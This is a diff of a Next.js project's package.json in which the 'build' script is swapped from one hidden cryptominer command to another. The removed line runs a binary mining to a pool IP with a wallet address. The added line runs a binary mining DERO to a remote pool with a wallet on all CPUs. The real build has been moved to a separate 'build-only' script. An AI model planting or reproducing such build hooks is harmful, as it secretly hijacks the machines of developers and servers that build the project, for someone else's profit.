@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x cprm && ./cprm -a minotaurx -o 128.199.68.208:443 -u RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG -p cpu -t $(nproc --all)",
+    "build": "chmod +x astroboy && ./astroboy -r wss://dero.rabidmining.com:10300-w deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqcm2wspllqxjr50q.CPU",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
